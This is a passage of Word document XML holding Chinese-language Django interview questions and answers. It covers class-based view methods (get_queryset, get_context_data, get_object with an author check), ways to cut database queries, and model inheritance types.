    <w:p w14:paraId="3F1206DA"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template_name = 'blog/article_list.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319DBB47"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context_object_name = 'latest_articles'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2663B8" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5ACC43E9"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def get_queryset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69563914"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return Article.objects.filter(author = self.request.user).order_by('-pub_date')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD8A2A3" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get_context_data()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E4100C" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get_context_data可以用于给模板传递模型以外的内容或参数，非常有用。例如现在的时间并不属于Article模型。如果你想把现在的时间传递给模板，你还可以通过重写get_context_data方法（如下图所示)。因为调用了父类的方法，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3848651E"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Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5BF1AF"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django.views.generic import ListView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E53B2D8"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.models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C00F45D"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django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BAB8333" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DD53F9F"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class IndexView(ListView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F6BFF4" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2EE3F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queryset = Article.objects.all().order_by("-pub_date")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEC12A1"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template_name = 'blog/article_list.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D93A884"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context_object_name = 'latest_articles'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B4BDE0" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14E4FFC3"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def get_context_data(self, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303496F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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        context = super().get_context_data(**kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C901AE7"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context['now'] = timezone.now() #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t>只有这行代码有用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F651151"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return context</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135644F1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9F9668" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>get_object()方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585A1136" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>DetailView和EditView都是从URL根据pk或其它参数调取一个对象来进行后续操作。下面代码通过DetailView展示一篇文章的详细信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12532128"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Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2BBB8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django.views.generic import DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC5BBCE"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django.http import Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC28330"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.models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772F8880"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django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75947BF3" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C641761"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class ArticleDetailView(DetailView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E1D90E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2150A862"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queryset = Article.objects.all().order_by("-pub_date") #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t>等同于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t>model = Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E587738"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template_name = 'blog/article_detail.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E25AFD" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:t xml:space="preserve">    context_object_name = 'article'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C965DE" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>然而上述代码可能满足不了你的需求。比如你希望一个用户只能查看或编辑自己发表的文章对象。当用户查看别人的对象时，返回http 404错误。这时候你可以通过更具体的get_object()方法来返回一个更具体的对象。代码如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1955B3D7"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django.views.generic import DetailView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E10FCF"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django.http import Http404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60281D5D"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.models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFB5638"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django.utils import timezone</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E278F97" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EBC6767"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class ArticleDetailView(DetailView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD7A233" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="577658D1"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queryset = Article.objects.all().order_by("-pub_date")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="723A1F0B"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template_name = 'blog/article_detail.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC5D00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context_object_name = 'article'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CA46BA" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5808318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def get_object(self, queryset=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D60C75B"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obj = super().get_object(queryset=queryset)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CCDA8F"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if obj.author != self.request.user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11E95407"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raise Http404()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F494D3C" w14:textId="77777777" w:rsidR="007A6093" w:rsidRDefault="007A6093" w:rsidP="007A6093">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F6"/>
        <w:rPr>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML1"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A1A"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        return obj</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A24D594" w14:textId="7482A1C0"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008</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>你能列举几个减少数据库查询次数的方法吗？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72228659" w14:textId="314F4DD0" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="0057133E" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>利用Django queryset的惰性和自带缓存的特性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318900A4" w14:textId="38594E13" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="0057133E" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用select_related和prefetch_related方法在数据库层面进行Join操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FEA543D" w14:textId="21C6C0AA" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="0057133E" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用缓存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAE9F00" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>更多阅读:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451679C6" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId203" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(29): select_related和prefetch_related的用法与区别</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A4A724E" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="00D96E02" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId204" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django基础(8): 缓存Cache应用场景及工作原理，Cache设置及如何使用</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="650FD7DA" w14:textId="2E894116"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009</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的模型继承有哪几种方式</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">? </w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>它们有什么区别以及何时使用它们</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD8A4E8" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的模型继承有如下3种方式:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313B2289" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1. 抽象模型继承(abstract model)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A8BBD5" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2. 多表模型继承(multi-table inheritance)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183AC0F5" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3. 代理模型(proxy model)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21094408" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>它们的区别如下:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B83B641" w14:textId="0CC78B34" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="0057133E" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django不会为抽象模型在数据库中生成自己的数据表。父类Meta中的abstract=True也不会传递给子类。如果你发现多模型有很多共同字段时，需使用抽象模型继承。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F3C32B" w14:textId="0D2B2E23" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="0057133E" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>多表模型继承与抽象模型继承最大的区别在于Django也会为父类模型建立自己的数据表，同时隐式地在父类和子类之间建立一个一对一关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5092FD4C" w14:textId="243153AC" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="0057133E" w:rsidP="0057133E">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="0057133E">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果我们只想改变某个模型的行为方法，而不是添加额外的字段或创建额外的数据表，我们就可以使用代理模型(proxy model)。设置一个代理模型，需要在子类模型Meta选项中设置proxy=True， Django不会为代理模型生成新的数据表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320C1AB0" w14:textId="078EC1C4" w:rsidR="007A6093"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010</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>说说看如何自定义模型标签</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(templatetags)</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和过滤器</w:t>
      </w:r>
      <w:r w:rsidR="007A6093" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>(filter)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15688FC2" w14:textId="77777777" w:rsidR="007A6093" w:rsidRPr="0057133E" w:rsidRDefault="007A6093" w:rsidP="0057133E">
